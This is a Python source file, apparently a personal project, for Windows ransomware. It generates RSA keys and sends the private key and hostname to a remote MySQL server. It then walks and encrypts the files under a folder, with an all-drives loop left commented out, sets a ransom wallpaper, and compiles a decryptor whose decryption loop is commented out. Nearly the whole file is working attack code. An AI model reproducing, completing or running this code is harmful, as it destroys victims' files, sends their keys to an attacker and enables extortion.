# how will the ransomware work :
# 1- safeguard
# 2- generate key
# 3- save it to server with the hostname and time
# 4- go through the files
# 5- encrypt the files
# 6- show encryption screen
# 7- install decryption software
# 8- if the key is correct :
# go through encrypted files and decrypt them

# Bonus : Trojan horse
from __init__ import encrypt_file
from key import newkeys
import win32api
import os
from datetime import datetime
import mysql.connector


def protect_Code_Files(filename):
    if filename in ("__init__.py", "asn1.py", "cli.py", "common.py",
                    "core.py", "key.py", "parallel.py", "pem.py",
                    "pkcs1.py", "pkcs1_v2.py", "prime.py", "randnum.py",
                    "trasform.py", "util.py"):
        return True
    return False


# ############################ 1- safeguard ################################
code = input("enter the launching code\n")
if code != "go":
    quit()

# ############################ 2- generate key ################################

print('################## Key generation ##################')
# generate a keypair
(pubkey, privkey) = newkeys(1024)
print(pubkey)
print(privkey)

input(">")
# ############################ 3- save key and the host name to a server ################################
hostname = os.getenv('COMPUTERNAME')
time = datetime.now()
publicKey = str(pubkey.n) + "," + str(pubkey.e)
privateKey = str(privkey.n) + "," + str(privkey.e) + "," + str(privkey.d) + "," + str(privkey.p) + "," + str(privkey.q)
# connect to the database
cnx = mysql.connector.connect(user='root', password='', host='192.168.1.6', database='ransomkey')
cursor = cnx.cursor()

input('wait')
# insert into database
insert_query = "INSERT INTO ransomkeys (time, hostname, public_key, private_key) VALUES (%s, %s, %s, %s)"
values = (str(time), str(hostname), str(publicKey), str(privateKey))
cursor.execute(insert_query, values)
cnx.commit()  # commit the transaction

# close the cursor and connection
cursor.close()
cnx.close()

input(">")

# ############################ 4- go through the files ################################
drives = win32api.GetLogicalDriveStrings()
drives = drives.split('\000')[:-1]

# for drive in drives:
#     for dirpath, dirnames, filenames in os.walk(drive):
#         for filename in filenames:
#             if protect_Code_Files(filename) == False:
#                 file = os.path.join(dirpath, filename)
#                 try:
#                     # ############################ 5- encrypt the files ################################
#                     encrypt_file(file, pubkey)
#                     print(file)
#                 except:
#                     print("can't encrypt the file : " + str(file))

drive = "C:\\Users\\win10\\Desktop\\Test"
for dirpath, dirnames, filenames in os.walk(drive):
        for filename in filenames:
            if protect_Code_Files(filename) == False:
                file = os.path.join(dirpath, filename)
                try:
                    # ############################ 5- encrypt the files ################################
                    encrypt_file(file, pubkey)
                    print(file)
                except:
                    print("can't encrypt the file : " + str(file))

input(">")

# ############################ 6- show encryption screen ################################
import ctypes

# define constants
SPI_SETDESKWALLPAPER = 20
SPIF_UPDATEINIFILE = 0x01
SPIF_SENDWININICHANGE = 0x02

# set the path to your desired image file
image_path = r"C:\\Users\\win10\\Desktop\\pythonProject\\image.png"

# call the SystemParametersInfo function to set the desktop wallpaper
ctypes.windll.user32.SystemParametersInfoW(
    SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)


# ############################ 7- create decryptor program ################################
import subprocess

program_code = '''
import os
import sys
 
# adding Folder_2 to the system path
sys.path.insert(0, 'C:\\\\Users\\\\win10\\\\Desktop\\\\pythonProject')

import win32api
from datetime import datetime
import mysql.connector
from __init__ import decrypt_file
from key import newkeys, PrivateKey

def decyptionalgorithme(key):
    key = key.split(",")
    finalkey = PrivateKey(int(key[0]), int(key[1]), int(key[2]), int(key[3]), int(key[4]))    
    
    # drives = win32api.GetLogicalDriveStrings()
    # drives = drives.split('\000')[:-1]
    
    #for drive in drives:
    #    for dirpath, dirnames, filenames in os.walk(drive):
    #        for filename in filenames:
    #            if protect_Code_Files(filename) == False:
    #                file = os.path.join(dirpath, filename)
    #                try:  # 5- encrypting_files
    #                    decrypt_file(file, finalkey) 
    #                except:
    #                    print("can't decrypt the file : " + str(file))               

def decrypt():
    hostname = []
    hostname.append(os.getenv('COMPUTERNAME'))
    cnx = mysql.connector.connect(user='root', password='',
                               host='192.168.1.6', database='ransomkey')
    cursor = cnx.cursor()
    query = "SELECT private_key FROM ransomkeys where hostname=%s"
    params = (hostname)
    
    cursor.execute(query, params)
    results = cursor.fetchall()
    
    key = str(input("Enter the key"))
    for result in results:
        if key == result[0]:
            decyptionalgorithme(key)
        else:
            print("wrong key")

decrypt()

'''

program_code = program_code.replace('\0', '')
program_name = "decryptor.py"
program_path = f"./{program_name}"

with open(program_path, 'w') as f:
    f.write(program_code)

subprocess.run(f"pyinstaller {program_name} --onefile")

os.remove(program_path)

#subprocess.run(f"./dist/{program_name.split('.')[0]}")

# trojan horse : allahou a3lem
